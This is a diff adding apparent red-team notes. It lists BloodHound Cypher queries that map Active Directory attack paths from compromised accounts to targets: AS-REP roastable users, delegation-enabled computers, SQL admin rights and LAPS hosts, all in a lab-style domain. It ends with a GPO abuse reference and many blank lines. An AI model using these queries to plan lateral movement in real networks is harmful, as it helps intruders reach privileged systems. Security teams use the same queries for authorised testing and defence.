+MATCH p=shortestPath((c {owned: true})-[*1..]->(s:Computer)) WHERE NOT c = s RETURN p
+MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+MATCH (u:User {owned:true}) RETURN u
+MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p
+MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
+MATCH (u:User {owned:true}), (c:Computer {name: "SRV-2.CHILD.REDTEAMOPS.LOCAL"}), p=shortestPath((u)-[*1..]->(c)) RETURN p
+MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
+MATCH (c:Computer {haslaps: true}) RETURN c
+GPO ABUSE
+https://wald0.com/?p=112
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+              
